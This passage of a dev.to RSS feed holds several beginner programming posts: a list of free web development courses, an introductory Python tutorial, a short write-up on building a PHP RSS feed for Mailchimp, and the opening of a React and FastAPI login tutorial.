  Free Courses 🆓
&lt;/h3&gt;

&lt;h4&gt;
  &lt;a href="#1-learn-html5-and-css3-from-scratch"&gt;
  &lt;/a&gt;
  1. &lt;a href="https://www.youtube.com/watch?v=mU6anWqZJcc&amp;amp;ab_channel=freeCodeCamp.org"&gt;Learn HTML5 and CSS3 From Scratch&lt;/a&gt;
&lt;/h4&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--QygSzK9g--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://i.imgur.com/bdWqPxP.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--QygSzK9g--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://i.imgur.com/bdWqPxP.png" width="880" height="549"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;A freecodecamp course on youtube to learn the basics of HTML5 and CSS.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#2-learn-javascript"&gt;
  &lt;/a&gt;
  2. &lt;a href="https://www.codecademy.com/learn/introduction-to-javascript"&gt;Learn JavaScript&lt;/a&gt;
&lt;/h4&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--UvpM-Xv8--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://i.imgur.com/LJCFzfh.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--UvpM-Xv8--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://i.imgur.com/LJCFzfh.png" width="880" height="479"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#3-learning-ecmascript-the-next-generation-of-javascript"&gt;
  &lt;/a&gt;
  3. &lt;a href="https://www.udemy.com/course/ecmascript2015/"&gt;Learning ECMAScript The Next Generation of Javascript&lt;/a&gt;
&lt;/h4&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--bntqQMX9--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://i.imgur.com/kIeXTih.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--bntqQMX9--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://i.imgur.com/kIeXTih.png" width="880" height="404"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#4-learn-to-program-in-javascript-beginner-to-pro"&gt;
  &lt;/a&gt;
  4. &lt;a href="https://www.udemy.com/course/programming-in-javascript/"&gt;Learn to Program in Javascript: Beginner to Pro&lt;/a&gt;
&lt;/h4&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--sboDft20--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://i.imgur.com/fb32EX7.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--sboDft20--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://i.imgur.com/fb32EX7.png" width="880" height="424"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#5-build-a-quiz-app-with-html-css-and-javascript"&gt;
  &lt;/a&gt;
  5. &lt;a href="https://www.udemy.com/course/build-a-quiz-app-with-html-css-and-javascript/"&gt;Build a Quiz App with HTML, CSS, and JavaScript&lt;/a&gt;
&lt;/h4&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--gjRRMTcY--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://i.imgur.com/cwGqgkc.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--gjRRMTcY--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://i.imgur.com/cwGqgkc.png" width="880" height="477"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#6-advanced-and-object-oriented-javascript-and-es6"&gt;
  &lt;/a&gt;
  6. &lt;a href="https://www.udemy.com/course/advanced-and-object-oriented-javascript/"&gt;Advanced and Object Oriented JavaScript and ES6&lt;/a&gt;
&lt;/h4&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--Be0e2PzI--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://i.imgur.com/saAsZiR.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--Be0e2PzI--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://i.imgur.com/saAsZiR.png" width="880" height="455"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#7-foundations-of-frontend-web-development"&gt;
  &lt;/a&gt;
  7. &lt;a href="https://www.udemy.com/course/foundations-of-front-end-development/"&gt;Foundations of Front-End Web Development&lt;/a&gt;
&lt;/h4&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--ZxRkdgRr--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://i.imgur.com/AY9fmgU.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--ZxRkdgRr--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://i.imgur.com/AY9fmgU.png" width="880" height="419"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#8-master-the-basics-of-html5-amp-css3-beginner-web-development"&gt;
  &lt;/a&gt;
  8. &lt;a href="https://www.udemy.com/course/master-the-basics-of-html5-css3-beginner-web-development/"&gt;Master the Basics of HTML5 &amp;amp; CSS3: Beginner Web Development&lt;/a&gt;
&lt;/h4&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--gj1bwFyE--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://i.imgur.com/r0twK4k.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--gj1bwFyE--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://i.imgur.com/r0twK4k.png" width="880" height="440"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Thanks for reading the article ❤️&lt;/p&gt;

&lt;p&gt;&lt;a href="https://www.buymeacoffee.com/suprabhasupi"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--aDe0OdcG--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://i.imgur.com/4t25pJE.png" alt="Buy Me A Coffee" width="300" height="96"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;div class="table-wrapper-paragraph"&gt;&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;
        🌟 &lt;a href="https://twitter.com/suprabhasupi"&gt; Twitter&lt;/a&gt;
      &lt;/td&gt;
      &lt;td&gt;
        📚 &lt;a href="https://gum.co/css-pseudo-class-elements"&gt; Ebooks&lt;/a&gt;
      &lt;/td&gt;
&lt;td&gt;
        🌟 &lt;a href="https://www.instagram.com/suprabhasupi/"&gt; Instagram&lt;/a&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;

</description>
      <category>javascript</category>
      <category>webdev</category>
      <category>beginners</category>
      <category>css</category>
    </item>
    <item>
      <title>Basic Python Concepts</title>
      <author>Ashutosh Mishra</author>
      <pubDate>Fri, 24 Dec 2021 21:28:13 +0000</pubDate>
      <link>https://dev.to/ashutoshmishra/basic-python-concepts-o8d</link>
      <guid>https://dev.to/ashutoshmishra/basic-python-concepts-o8d</guid>
      <description>&lt;p&gt;In this post, we are going to learn about some of the basic concepts of Python which more or less are also found in other programming languages. We'll start from the installation of Python and cover mathematical operations, strings, user input, string operations, variables, and In place operators.&lt;/p&gt;

&lt;p&gt;If you don't know, this blog post and all other future posts in the Python series are part of  &lt;a href="https://www.udemy.com/course/python-masterclass-course/"&gt;this&lt;/a&gt; Udemy course. Do check it out.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#installation"&gt;
  &lt;/a&gt;
  Installation
&lt;/h2&gt;

&lt;p&gt;Before starting if you don't have Python installed on your computer, install the latest version of &lt;a href="https://www.python.org/downloads/"&gt;Python 3&lt;/a&gt; from their website and a corresponding IDE to code which we'll use for writing big programs, you can either go with &lt;a href="https://code.visualstudio.com/download"&gt;VS Code&lt;/a&gt; or &lt;a href="https://www.jetbrains.com/pycharm/download/#section=windows"&gt;Pycharm&lt;/a&gt;.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#our-first-program"&gt;
  &lt;/a&gt;
  Our First Program
&lt;/h2&gt;

&lt;p&gt;We'll start with the basic &lt;em&gt;Hello World&lt;/em&gt; program. So open your Python console and follow the article -&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;print('Hello World')
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Type the above code in the console and hit enter. By now you would have seen the &lt;strong&gt;Hello World&lt;/strong&gt; printed on your console. That's how easy it is to print something on the console in Python. But let's just move ahead because not everything is going to be that easy in the future.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#maths-operations"&gt;
  &lt;/a&gt;
  Maths Operations
&lt;/h2&gt;

&lt;p&gt;Python console can also be directly used as a calculator and we can perform most of the common operations which we do on a calculator.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#addition-subtraction-multiplication-and-division"&gt;
  &lt;/a&gt;
  Addition, Subtraction, Multiplication, and Division
&lt;/h3&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight python"&gt;&lt;code&gt;&lt;span class="mi"&gt;120&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;80&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Type the above code and hit enter and you will see the right answer 200. You can also perform subtraction, multiplication, and division in the console. Copy the code below in your console and see the results.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;50 - 20

30 * 2

12 / 2
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;If you're focusing enough, you can see that when we divide certain numbers in Python, we get our result in decimal, just like we got 6.0 in the result of the above division. This is called a Float.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#float"&gt;
  &lt;/a&gt;
  Float
&lt;/h3&gt;

&lt;p&gt;Decimal numbers are known as Float in programming. Float is a number that is not an integer. &lt;br&gt;
Using float with any mathematical expression will always result in float. When dividing 2 numbers, you can avoid getting float as a result by using &lt;em&gt;double slash(//)&lt;/em&gt;.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;12 // 2
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The above code will give 6 as a result instead of 6.0, it happens because when we use a double slash in a division, Python gives us the quotient of the division.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#zerodivisionerror"&gt;
  &lt;/a&gt;
  ZeroDivisionError
&lt;/h3&gt;

&lt;p&gt;Dividing any number with zero in Python gives divide by zero error. So avoid dividing any number with zero or performing any other calculation which involves division by zero.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#exponent"&gt;
  &lt;/a&gt;
  Exponent
&lt;/h3&gt;

&lt;p&gt;Exponent is a number raised to the power of a certain number. In Python, you can do this by using **&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;3 ** 2
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The above expression will raise 2 to the power of 3 and you'll get 9 as the result.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#modulus"&gt;
  &lt;/a&gt;
  Modulus
&lt;/h3&gt;

&lt;p&gt;We already discussed how using double slash you can avoid getting float as a result of division. This happens because double slash gives the quotient of a division as a result.&lt;br&gt;
For Ex: 10//3 = 3&lt;/p&gt;

&lt;p&gt;But what if instead of getting quotient, you want the remainder of the division? We have something called &lt;strong&gt;Modulus&lt;/strong&gt; for this case. The symbol of modulus is percent(%). Let's see it in action below -&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;11 % 3
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The above operation will result in 2 as the answer because that will be the actual result of the above division. This operation is incredibly useful when you want to know whether a certain number is odd or even. &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#string"&gt;
  &lt;/a&gt;
  String
&lt;/h2&gt;

&lt;p&gt;Any text written in Python is a string or in other words, you can also say that anything written within quotes whether single('') or double("") is a string. If you type an integer within quotes, it will also be considered as a string, not an integer. &lt;br&gt;
For Ex: 5 is an integer, '5' is a string.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;NOTE: While writing a string if you want to put an apostrophe somewhere in between, use a backslash(\)&lt;/em&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Instead of writing, 'He's a good boy', write, &lt;code&gt;'He\'s a good boy'&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;The latter version of the string will save you from error because you already have finished the string in the first 2 letters. According to Python, you started your string from &lt;strong&gt;H&lt;/strong&gt; and finished it at &lt;strong&gt;e&lt;/strong&gt; since you already have used 2 quotes up to that point.&lt;/li&gt;
&lt;li&gt;If you want your string to be printed on multiple lines instead of one, you can use &lt;code&gt;\n&lt;/code&gt; at the point after which you want to start a new line. &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;
  &lt;a href="#accepting-input-from-the-user"&gt;
  &lt;/a&gt;
  Accepting input from the user
&lt;/h2&gt;

&lt;p&gt;User inputs are very common when building large applications. Consider the example of a &lt;strong&gt;Contacts&lt;/strong&gt; app where the user has to enter the phone number and name to save a contact or a &lt;strong&gt;Chat&lt;/strong&gt; app where users can input words, numbers, emojis, and whatnot. &lt;/p&gt;

&lt;p&gt;In Python, we have a function called &lt;strong&gt;&lt;em&gt;input()&lt;/em&gt;&lt;/strong&gt; that allow users to input numbers, strings, etc in our program.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;input('Please enter a value: ')
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The string inside &lt;em&gt;input()&lt;/em&gt; will be displayed to the user when asked for input. You can modify it according to your needs. Whatever value user inputs will be displayed to the console.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#string-operation"&gt;
  &lt;/a&gt;
  String Operation
&lt;/h2&gt;

&lt;h3&gt;
  &lt;a href="#concatenation-operation"&gt;
  &lt;/a&gt;
  Concatenation operation
&lt;/h3&gt;

&lt;p&gt;Concatenation is the action of joining 2 or more strings together. Suppose there is a string called &lt;em&gt;'Hello'&lt;/em&gt; and there is another string called &lt;em&gt;'World'&lt;/em&gt;. When you concatenate these 2 strings, it becomes &lt;em&gt;'HelloWorld'&lt;/em&gt;.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;'Hello' + 'World'
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The plus sign above is the concatenation operator which is used to concatenate strings. If you enter the code right and hit enter, you'll see &lt;code&gt;'HelloWorld'&lt;/code&gt; printed on your console.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Note:&lt;/em&gt; &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;You cannot concatenate a string with a number. &lt;/li&gt;
&lt;li&gt;However, you can multiple a string with a certain number to repeat its occurrence. For Ex - &lt;code&gt;'Hello'*3&lt;/code&gt; will result in &lt;code&gt;'HelloHelloHello'&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Again you cannot multiple a string with a string, it will produce error.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#variables"&gt;
  &lt;/a&gt;
  Variables
&lt;/h2&gt;

&lt;p&gt;If you are familiar with Python or any other programming language, you might already know what a variable is. But in case you don't, you can think of it as a container to store data. Variables are common in every programming language and they let us store data types supported in that programming language. In Python, you can store all the supported data types in the variables.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;a = 100
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;In the above code, a is the variable that we've used to store the value of 100. The equal(=) sign is called an assignment operator whose job is to assign values. Type &lt;code&gt;print(a)&lt;/code&gt; to print the value of variable &lt;strong&gt;a&lt;/strong&gt; in the console.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#in-place-operators"&gt;
  &lt;/a&gt;
  In place operators
&lt;/h2&gt;

&lt;p&gt;Suppose you're recording your age in a variable and want to update it again this birthday.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;age = 21
age = age + 1
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;In the above code, we first stored our age in a variable and then used a method to update the variable which is logical but isn't the best practice because writing the variable name twice in a line just to add a single value to it is not considered a great practice.&lt;/p&gt;

&lt;p&gt;Instead, we have In place operators which help us change the value without repeating the variable name twice in the line. See the code below -&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;age+=1
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;age+=1&lt;/code&gt; has same effect as &lt;code&gt;age=age+1&lt;/code&gt;. The &lt;code&gt;+=&lt;/code&gt; removes the need to repeat the variable name twice in the line totally.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;We can also use the subtract and multiplication operator instead of the addition operator to update the subtracted or multiplied value of the variable like &lt;code&gt;age-=2&lt;/code&gt; and &lt;code&gt;age*=4&lt;/code&gt;. The former will reduce the value of the age variable by 2 and the latter will multiply it by 4.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#parting-thoughts"&gt;
  &lt;/a&gt;
  Parting Thoughts
&lt;/h2&gt;

&lt;p&gt;In this article, we learned about maths operations, strings, variables, user input, In place operators, etc., and that marked the end of our &lt;strong&gt;Basic Python Concepts&lt;/strong&gt;. &lt;/p&gt;

&lt;p&gt;There are thousands of things in a programming language and I don't mean that this article has covered every basic concept of Python but we've surely learned enough to move ahead and learn other topics and in the next article of the series we'll learn about &lt;strong&gt;Control Structures in Python&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Stay tuned.&lt;/p&gt;

</description>
      <category>python</category>
      <category>programming</category>
      <category>tutorial</category>
      <category>beginners</category>
    </item>
    <item>
      <title>Automating the flow of blog posts to my email list with PHP ⚙️</title>
      <author>Kelvin Graddick</author>
      <pubDate>Fri, 24 Dec 2021 20:18:26 +0000</pubDate>
      <link>https://dev.to/kgcodes/automating-the-flow-of-blog-posts-to-my-email-list-with-php-3k2p</link>
      <guid>https://dev.to/kgcodes/automating-the-flow-of-blog-posts-to-my-email-list-with-php-3k2p</guid>
      <description>&lt;p&gt;A while back ⁣I decided that I wanted to &lt;strong&gt;automate the flow of blog posts to my email list&lt;/strong&gt; (which is basically nobody right now by the way 😅).&lt;/p&gt;

&lt;p&gt;I found that &lt;a href="//www.mailchimp.com"&gt;Mailchimp&lt;/a&gt; has a feature for &lt;strong&gt;automatically sending to an email list based on RSS feed&lt;/strong&gt; updates on a website.&lt;/p&gt;

&lt;p&gt;A &lt;a href="https://en.wikipedia.org/wiki/RSS"&gt;RSS (Rich Site Summary or Really Simple Syndication)&lt;/a&gt; is a web feed format that allows users and applications to access updates to websites in a standardized way.&lt;/p&gt;

&lt;p&gt;RSS feeds are usually generated for you in website builders and other tools but since my site was built from scratch I needed to make my own.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Here is what I needed to do:&lt;/strong&gt;&lt;br&gt;
— find the RSS feed XML format online&lt;br&gt;
— create a new PHP page on my website in the RSS format&lt;br&gt;
— dynamically populate the RSS feed items with my blog posts from the database&lt;br&gt;
— test the RSS feed page on a validator website&lt;br&gt;
— setup a RSS feed email campaign using the feed on Mailchimp&lt;br&gt;
— design/style the email template&lt;br&gt;
— send a test email to myself to verify&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s---sE6pol5--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/xm04x6ey021ox3h8yfwz.jpeg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s---sE6pol5--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/xm04x6ey021ox3h8yfwz.jpeg" alt="Automating the flow of blog posts to my email list with PHP" width="880" height="1100"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--VC9fmK-U--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/amejh72jn1204ivlmwse.jpeg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--VC9fmK-U--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/amejh72jn1204ivlmwse.jpeg" alt="PHP script that generates a RSS feed based on my website's blog posts" width="880" height="1100"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--vHZfgh66--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/l50bzqkq9eoik1cizuqe.jpeg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--vHZfgh66--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/l50bzqkq9eoik1cizuqe.jpeg" alt="Here is the generated RSS feed XML file. A user or application can subscribe for blog updates." width="880" height="1100"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--M5dZxc7K--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/d6uiu7i083lch759jj2z.jpeg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--M5dZxc7K--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/d6uiu7i083lch759jj2z.jpeg" alt="Created an automatic email campaign using the RSS feed on MailChimp" width="880" height="1100"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--uWEMieE0--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/lrz5lq4325y7nbp8vjwk.jpeg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--uWEMieE0--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/lrz5lq4325y7nbp8vjwk.jpeg" alt="Test email from RSS feed" width="880" height="1100"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;That was a fun, quick project to work on for a few hours and saved me an exponential amount of time in the future. 💪🏾&lt;/p&gt;

&lt;p&gt;⁉️ Anyone have experience with RSS feeds or subscribe to any?&lt;/p&gt;

</description>
      <category>programming</category>
      <category>webdev</category>
      <category>tutorial</category>
      <category>php</category>
    </item>
    <item>
      <title>Login Authentication With React And FastAPI</title>
      <author>oyedeletemitope</author>
      <pubDate>Fri, 24 Dec 2021 20:17:43 +0000</pubDate>
      <link>https://dev.to/oyedeletemitope/login-authentication-with-react-and-fastapi-397b</link>
      <guid>https://dev.to/oyedeletemitope/login-authentication-with-react-and-fastapi-397b</guid>
      <description>&lt;h3&gt;
  &lt;a href="#introduction"&gt;
  &lt;/a&gt;
  Introduction
&lt;/h3&gt;

&lt;p&gt;In this tutorial, we'll be building a login authentication using React and FastApi. This will help show how we can use both packages for a login authentication process but before that, let's take at React and also what FastApi is.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#what-is-fastapi"&gt;
  &lt;/a&gt;
  What is FastApi
&lt;/h3&gt;

&lt;p&gt;FastAPI is a modern, fast (high-performance), web framework for building APIs with Python. It supports both synchronous and asynchronous actions, as well as data validation, authentication, and interactive API documentation, all of which are powered by OpenAPI. It comes with exciting features like:&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#what-is-react"&gt;
  &lt;/a&gt;
  What is React
&lt;/h3&gt;

&lt;p&gt;React is a user interface development library. It can construct full-stack apps by talking with a server/API and operates as an SPA (single page app) on the client. Because it is competent and directly equivalent to frameworks like Angular or Vue, React is frequently referred to as a frontend "framework".&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#requirements"&gt;
  &lt;/a&gt;
  Requirements
&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Python installed.&lt;/li&gt;
&lt;li&gt;Basic knowledge of Javascript.&lt;/li&gt;
&lt;li&gt;Basic Knowledge of React.&lt;/li&gt;
&lt;li&gt;Knowledge on python is a plus.&lt;/li&gt;
&lt;/ul&gt;

&lt;h4&gt;
  &lt;a href="#installing-fastapi"&gt;
  &lt;/a&gt;
  Installing FastAPI
&lt;/h4&gt;

&lt;p&gt;open up our terminal and cd into our &lt;code&gt;project folder&lt;/code&gt; and write the following:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;mkdir &lt;/span&gt;backend
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;code&gt;cd&lt;/code&gt; into the just created folder and run the following:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;pip &lt;span class="nb"&gt;install &lt;/span&gt;fastapi
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;





&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;pip &lt;span class="nb"&gt;install&lt;/span&gt; &lt;span class="s2"&gt;"uvicorn[standard]"&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;





&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;pip &lt;span class="nb"&gt;install &lt;/span&gt;pyjwt
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;let's leave that for later and proceed with building our frontend.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#building-the-frontend"&gt;
  &lt;/a&gt;
  Building The Frontend
&lt;/h4&gt;

&lt;p&gt;let's create and app and install the following packages:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;npx create-react-app frontend
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Next we install the following packages:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;npm &lt;span class="nb"&gt;install &lt;/span&gt;axios react-router-dom
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;After we've done that, navigate to &lt;code&gt;src/index.js&lt;/code&gt; and import &lt;code&gt;BrowserRouter&lt;/code&gt; :&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;BrowserRouter&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;react-router-dom&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



